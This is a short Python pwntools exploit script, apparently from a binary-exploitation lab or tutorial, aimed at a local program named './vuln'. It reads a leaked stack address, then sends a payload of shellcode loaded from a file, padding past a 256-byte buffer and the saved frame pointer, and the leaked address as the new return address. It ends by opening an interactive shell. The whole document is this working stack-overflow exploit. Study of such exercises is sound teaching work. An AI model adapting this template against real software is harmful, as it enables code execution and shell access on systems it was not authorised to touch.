#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
elf = ELF(BIN)

# machine_code_addr = elf.symbols["machine_code"]

# Later, we'll see how to use pwntools to solve this step as well.
with open("binsh_shellcode", "rb") as fin:
    shellcode = fin.read()



io = process(BIN)
address = io.recvline()


# First part: inject
payload = b""
payload += shellcode
payload += b"A" * (256 - len(shellcode))
payload += b"A" * 8
payload += p64(int(address, 16))

io.send(payload)
io.interactive()
